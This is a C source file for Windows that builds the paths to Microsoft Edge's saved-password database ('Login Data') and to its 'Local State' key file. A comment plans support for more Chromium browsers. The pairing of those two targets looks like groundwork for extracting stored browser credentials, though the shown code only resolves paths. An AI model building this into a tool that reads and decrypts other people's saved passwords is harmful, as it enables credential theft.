// clang-format off
// knownfolders needs to be after shlobj
#include <shlobj.h>
#include <knownfolders.h>
// clang-format on

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

/// Windows doesn't perform any kind of translation when storing or reading file
/// names and they are stored as UTF-16. This is why we handle PWSTR's here

// TODO Make this a parameter so that we can support multiple chromium browsers
#define LOGINDATA_PATH L"\\Microsoft\\Edge\\User Data\\Default\\Login Data"
#define LOCAL_STATE_FILE L"\\Microsoft\\Edge\\User Data\\Local State"

// Returns the concatenation of `leftPath` and `rightPath` in `fullPathOut`
// NOTE `fullPathOut should be freed by the caller`
int concat_paths(PCWSTR leftPath, PCWSTR rightPath, PWSTR* fullPathOut) {
  size_t totalLength = wcslen(leftPath) + wcslen(rightPath) + 1;
  *fullPathOut = (PWSTR)malloc(totalLength * sizeof(wchar_t));
  if (!*fullPathOut) {
    fprintf(stderr, "Failed to allocate memory for concatenated path\n");
    return EXIT_FAILURE;
  }

  wcscpy(*fullPathOut, leftPath);
  wcscat(*fullPathOut, rightPath);

  return EXIT_SUCCESS;
}

// Returns the Login Data file path gathered from environment variables
// NOTE: `loginDataPathOut` must be freed by the caller
int get_logindata_path(PWSTR* loginDataPathOut) {
    PWSTR appdataPath = NULL;
    HRESULT hr = SHGetKnownFolderPath(&FOLDERID_LocalAppData, 0, NULL, &appdataPath);
    if (FAILED(hr)) {
        fprintf(stderr, "Failed to retrieve APPDATA path. Error code: %08lX\n", hr);
        return EXIT_FAILURE;
    }

    if (concat_paths(appdataPath, LOGINDATA_PATH, loginDataPathOut) != EXIT_SUCCESS) {
        CoTaskMemFree(appdataPath);  // free memory from the call to SHGetKnownFolderPath
        return EXIT_FAILURE;
    }

    CoTaskMemFree(appdataPath);  // free memory from the call to SHGetKnownFolderPath
    return EXIT_SUCCESS;
}
 
// Returns the Local AppData path gathered from environment variables
// NOTE: `localStatePathOut` must be freed by the caller
int get_localstate_path(PWSTR* localStatePathOut) {
    PWSTR appdataPath = NULL;
    HRESULT hr = SHGetKnownFolderPath(&FOLDERID_LocalAppData, 0, NULL, &appdataPath);
    if (FAILED(hr)) {
        fprintf(stderr, "Failed to retrieve APPDATA path. Error code: %08lX\n", hr);
        return EXIT_FAILURE;
    }

    if (concat_paths(appdataPath, LOCAL_STATE_FILE, localStatePathOut) != EXIT_SUCCESS) {
        CoTaskMemFree(appdataPath);  // free memory from the call to SHGetKnownFolderPath
        return EXIT_FAILURE;
    }

    CoTaskMemFree(appdataPath);  // free memory from the call to SHGetKnownFolderPath
    return EXIT_SUCCESS;
}

